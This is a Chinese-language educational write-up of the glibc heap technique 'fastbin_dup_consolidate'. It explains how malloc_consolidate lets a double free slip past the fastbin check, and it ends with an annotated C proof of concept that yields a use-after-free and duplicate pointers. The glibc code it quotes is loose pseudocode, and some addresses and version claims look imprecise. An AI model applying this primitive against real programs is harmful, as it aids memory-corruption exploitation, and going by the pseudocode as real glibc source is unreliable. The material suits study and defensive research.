# 漏洞利用文档：fastbin_dup_consolidate

## # 攻击对象
- **fastbin chunks**：具体是大小为0x50的fastbin chunk（例如p1的chunk at 0x603410），其size位（0x51）标记为FASTBIN状态。
- **top chunk**：初始地址为0x603460，size位为0x134049。在malloc_consolidate过程中，fastbin chunk被合并到top chunk，改变top chunk的地址和size（例如变为0x603820 with size 0x207e1）。
- **bin链表**：fastbin[0x50]的链表指针（main_arena+32），在malloc_consolidate后被清空。
- **全局变量**：main_arena中的fastbin和top chunk指针，通过malloc_consolidate更新。

## # 利用过程
1. **分配fastbin chunk**：使用calloc分配一个大小为0x40的chunk（p1），实际chunk大小为0x50（包括头部），地址为0x603420。
2. **释放到fastbin**：free(p1)将p1加入fastbin[0x50]链表。
3. **触发malloc_consolidate**：分配一个大块内存（p3，大小为0x400），触发glibc的malloc_consolidate机制，将fastbin中的p1 chunk合并到top chunk。
4. **地址重叠**：p3从top chunk分配，与p1地址相同（0x603420），实现chunk重用。
5. **double free**：再次free(p1)，但由于chunk已不在fastbin中，绕过glibc的double free检查，造成悬空指针。
6. **UAF利用**：p3未被释放但指向已释放内存，形成Use-After-Free（UAF）。
7. **重新分配**：malloc(0x400)分配p4，从top chunk获得相同地址（0x603420），实现指针重复（p3和p4指向同一内存）。

## # 利用条件
- **悬空指针**：程序存在double free漏洞，允许对同一指针（p1）多次调用free。
- **堆操作顺序**：需要先分配fastbin chunk、释放、再分配大块内存触发malloc_consolidate，最后double free。
- **内存布局**：堆初始状态需有足够空间（如top chunk大小足够），且无其他bin干扰。
- **glibc版本**：适用于glibc 2.35及以上，其中malloc_consolidate仅在特定条件触发（如分配大块内存）。

## # 利用效果
- **Use-After-Free (UAF)**：p3指针指向已释放的内存区域（0x603420），允许读写无效内存。
- **指针重复**：获得两个指针（p3和p4）指向同一大块内存 chunk（大小0x410），可用于数据混淆或进一步攻击。
- **潜在升级**：结合其他漏洞（如堆溢出），可能实现任意地址分配、控制流劫持（如覆盖函数指针），但本原型仅演示指针重复。

## # 涉及缓解机制
glibc在free函数中对fastbin有double free检查，但malloc_consolidate会绕过此检查。相关源码伪代码（基于glibc 2.35）：

- **_int_free中的fastbin double free检查**：
  ```c
  if (chunk_is_fastbin_size(chunk)) {
    // 检查是否与fastbin的第一个chunk相同
    if (__builtin_expect (old == p, 0)) {
      errstr = "double free or corruption (fasttop)";
      goto errout; // 触发错误，中止free
    }
    // 否则，添加到fastbin
    fastbin_insert(av, p);
  }
  ```
- **malloc_consolidate机制**：当分配大块内存（>=0x400）时，调用malloc_consolidate合并fastbin chunks到unsorted bin或top chunk，清空fastbin：
  ```c
  void malloc_consolidate(mstate av) {
    // 遍历所有fastbin
    for (i = 0; i < NFASTBINS; ++i) {
      while (fastbin_chunk = fastbin[i]) {
        // 从fastbin中移除chunk
        unlink_fastbin_chunk(av, fastbin_chunk);
        // 合并相邻free chunk
        consolidate_chunk(fastbin_chunk);
        // 添加到unsorted bin或合并到top
        if (chunk_adjacent_to_top(fastbin_chunk)) {
          merge_with_top(fastbin_chunk);
        } else {
          add_to_unsorted_bin(fastbin_chunk);
        }
      }
    }
  }
  ```
- **绕过原因**：malloc_consolidate后，chunk不再在fastbin中，因此double free时，`old != p`，检查失败，允许free执行。

## # Proof of Concept
以下为漏洞利用原型源码，添加中文注释解释关键步骤：

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main() {
	printf("This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n");

	// 分配一个fastbin大小的chunk：请求0x40字节，实际chunk大小为0x50（包括头部），calloc初始化内存为0
	void* p1 = calloc(1,0x40); // p1地址为0x603420，chunk头部在0x603410（size=0x51）

	printf("Allocate a fastbin chunk p1=%p \n", p1);
  	printf("Freeing p1 will add it to the fastbin.\n\n");
  	free(p1); // 释放p1，将其加入fastbin[0x50]链表，此时fastbin指向0x603410

  	// 分配大块内存（0x400字节），触发malloc_consolidate：glibc会合并fastbin chunks到top chunk
  	void* p3 = malloc(0x400); // 分配后，p3地址为0x603420，与p1相同，因为chunk被合并后从top分配

	printf("To trigger malloc_consolidate we need to allocate a chunk with large chunk size (>= 0x400)\n");
	printf("which corresponds to request size >= 0x3f0. We will request 0x400 bytes, which will gives us\n");
	printf("a chunk with chunk size 0x410. p3=%p\n", p3);

	printf("\nmalloc_consolidate will merge the fast chunk p1 with top.\n");
	printf("p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n");

	assert(p1 == p3); // 验证p1和p3地址相同，确认malloc_consolidate效果

  	printf("We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n");
	free(p1); // double free漏洞：再次释放p1，但由于chunk已不在fastbin中（被合并到top），绕过glibc的double free检查

	printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
	printf("chunk got consolidated with it. We have thus achieved UAF!\n"); // 此时p3指向已释放内存，形成UAF

	printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
	printf("p3 and p1 will still be pointing to it.\n");
	void *p4 = malloc(0x400); // 分配p4，从top chunk获得相同地址（0x603420），实现指针重复

	assert(p4 == p3); // 验证p4和p3地址相同，确认指针重复

	printf("We now have two pointers (p3 and p4) that haven't been directly freed\n");
	printf("and both point to the same large-sized chunk. p3=%p p4=%p\n", p3, p4);
	printf("We have achieved duplication!\n\n");
	return 0;
}
```

此PoC演示了如何利用malloc_consolidate和double free获得UAF和指针重复。关键步骤已用中文注释标出，适用于教育目的，实际利用需结合具体环境调整。